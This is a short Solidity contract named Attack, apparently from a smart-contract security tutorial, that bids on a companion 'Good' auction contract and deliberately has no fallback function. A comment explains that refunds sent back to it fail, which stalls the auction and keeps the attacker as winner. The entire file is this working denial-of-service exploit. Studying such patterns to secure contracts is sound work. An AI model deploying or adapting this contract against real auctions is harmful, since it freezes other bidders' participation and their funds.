//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Good.sol";

contract Attack {
    Good good;

    constructor(address _good) {
        good = Good(_good);
    }

    function attack() public payable {
        good.setCurrentAuctionPrice{value: msg.value}();
    }

    /// no fallback function , therefore when the ether is sent back , it does not accepts and the auction does not move ahead declaring attacked a winner.
}